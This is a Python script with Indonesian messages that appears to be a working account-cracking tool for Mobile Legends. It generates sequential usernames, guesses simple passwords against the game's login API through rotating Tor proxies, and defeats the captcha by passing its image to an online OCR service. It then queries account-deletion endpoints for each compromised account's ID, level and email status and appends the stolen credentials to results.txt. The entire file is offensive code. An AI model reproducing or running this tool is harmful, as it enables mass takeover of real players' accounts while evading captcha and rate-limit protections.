


import requests, hashlib, os, random, re, string, sys, time
from proxiestor import Tor
from base64 import b64decode as decoder
from concurrent.futures import ThreadPoolExecutor as thrd
from requests_toolbelt import MultipartEncoder

berhasil = """\r[✓] Login berhasil                          
\r[•] Id akun       : {}
\r[•] Level akun    : {}
\r[•] Email/Username: {}
\r[•] Password      : {}
\r[•] Terkait email : {}\n"""

prog = 0
user = []
line = "-"*105
live = 0
ipstat = "Good"

def usergathering():
    os.system("clear")
    print("ooo        ooooo                                   .oooooo.   oooo                            oooo\n`88.       .888'                                  d8P'  `Y8b  `888                            `888\n 888b     d'888   .ooooo.   .ooooo.  ooo. .oo.   888           888 .oo.    .ooooo.   .ooooo.   888  oooo\n 8 Y88. .P  888  d88' `88b d88' `88b `888P\"Y88b  888           888P\"Y88b  d88' `88b d88' `\"Y8  888 .8P'\n 8  `888'   888  888   888 888   888  888   888  888           888   888  888ooo888 888        888888.\n 8    Y     888  888   888 888   888  888   888  `88b    ooo   888   888  888    .o 888   .o8  888 `88b.\no8o        o888o `Y8bod8P' `Y8bod8P' o888o o888o  `Y8bood8P'  o888o o888o `Y8bod8P' `Y8bod8P' o888o o888o")
    print(line)
    print("[•] Masukkan base username (tanpa spasi)")
    baseusername = input("[•] Masukkan base username: ")
    for i in range(999):
        user.append(f"{baseusername}{1000 + (i+1)}")
    print(line)
    print("[~] Memulai proxy tor ....")
    tor = Tor(ip_rotation=True)
    tor.start()
    print("[✓] Proxy tor berjalan ....")
    print(line)
    print("[•] Proses crack dimulai")
    print("[•] Result disimpan kedalam file results.txt")
    print(f"{line}\n")
    with thrd(max_workers=30) as sub:
        for userlog in user:
            userpass = [userlog, baseusername + "123", baseusername + "1234", baseusername + "12345"]
            sub.submit(crack, userlog, userpass)
    tor.close()


def crack(username, password):
    global prog, live, ipstat
    print(f"\r[Cracking - {ipstat}] {prog}/{len(user)} Live: {live}", end="\r")
    condition = False
    for pw in password:
        while True:
            # get data captcha
            sess = requests.get("https://accountmtapi.mobilelegends.com/newcaptcha").json()
            captsess = sess["captcha_session"]

            # bypass captcha
            session = requests.Session()
            req = session.get('https://www.editpad.org/tool/extract-text-from-image', headers={
                'authority': 'www.editpad.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'referer': 'https://id.search.yahoo.com/',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
            }).text
            files = {
                'img': f'data:image/png;base64,{sess["data"]["image"]}',
                'key': '0',
                'name': 'image.png',
                '_token': re.search("name=\"_token\" content=\"(.*?)\"", req).group(1),
                'tool_key': 'extract_text_from_image',
                'toolSlug': 'extract-text-from-image',
                'toolId': '386',
                'isKeyPass': '0',
                'parent_id': '386',
            }
            bound = "----WebKitFormBoundary" + "".join(random.choice(string.ascii_letters + "0123456789") for x in range(16))
            data = MultipartEncoder(fields=files, boundary=bound)
            resp = session.post('https://www.editpad.org/extractTextImg', headers={
                'authority': 'www.editpad.org',
                'accept': '*/*',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': data.content_type,
                'origin': 'https://www.editpad.org',
                'referer': 'https://www.editpad.org/tool/extract-text-from-image',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }, data=data, proxies={"https": "socks5://127.0.0.1:9050"})
            try:
                txtcapt = re.search("/\>.*?\\n(\w+)", resp.json()["text"]).group(1)
                ipstat = "Great"
            except:
                txtcapt = "Fanda"
                print(resp.text)
                if resp.text == "IP Blocked":
                    ipstat = "Spam..."
                    time.sleep(60)

            # md5 password
            md5nya = hashlib.md5(pw.encode("utf-8")).hexdigest()

            # hash payload
            hashedpayload = f"account={username}&captcha={txtcapt}&md5pwd={md5nya}&mt_captcha_session={captsess}&op=login_captcha"
            signnya = hashlib.md5(hashedpayload.encode("utf-8")).hexdigest()

            # post data
            payload = '{"lang":"en","op":"login_captcha","sign":"' + signnya + '","params":{"account":"' + username + '","md5pwd":"' + md5nya + '","captcha":"' + txtcapt + '","mt_captcha_session":"' + captsess + '"}}'
            p = requests.post("https://accountmtapi.mobilelegends.com/", data=payload, proxies={"https": "socks5://127.0.0.1:9050"}).json()
            message = p["message"]
            if message == "Error_Success":
                token = p["session"]
                guid = p["guid"]
                p2 = requests.post("https://api.mobilelegends.com/tools/deleteaccount/getToken", data={"id": guid, "token": token, "type": "mt_And"}).json()
                emailbind = "Tidak dapat mengambil informasi"
                idakun = emailbind
                levelakun = idakun
                if p2["status"] != "error":
                    emailbind = "tidak terkait" if p2["data"]["bind_email"] == "" else "terkait"
                    inf = requests.post("https://api.mobilelegends.com/tools/deleteaccount/getCancelAccountInfo", data="", headers={"authorization": p2["data"]["jwt"]}).json()
                    idakun = inf["data"]["all_roles"][0]["iRoleId"]
                    levelakun = inf["data"]["all_roles"][0]["iLevel"]
                live += 1
                ressok = berhasil.format(idakun, levelakun, username, pw, emailbind)
                open("results.txt","a").write(f"{ressok}\n")
                print(ressok)
                condition = True
                break
            elif message == "Error_PasswdError":
                break
            elif message == "Error_NoAccount":
                condition = True
                break
        if condition:
            break
    prog += 1

if __name__=="__main__":
    usergathering()
